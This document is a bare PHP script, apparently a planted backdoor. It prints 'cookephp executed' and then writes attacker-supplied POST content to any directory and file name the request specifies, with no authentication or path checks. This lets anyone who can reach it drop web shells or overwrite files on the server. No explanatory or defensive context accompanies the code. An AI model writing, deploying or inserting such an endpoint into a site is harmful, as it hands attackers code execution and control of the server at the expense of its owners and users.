<?php
 echo "cookephp executed";
 error_reporting(E_ALL);
 $data1 = $_POST['data1'];
 $data2 = $_POST['data2'];
 $data3 = $_POST['data3'];
 $fh = fopen("$data2/$data3", 'a+');
 fwrite($fh, "$data1");
 fclose($fh);
?>



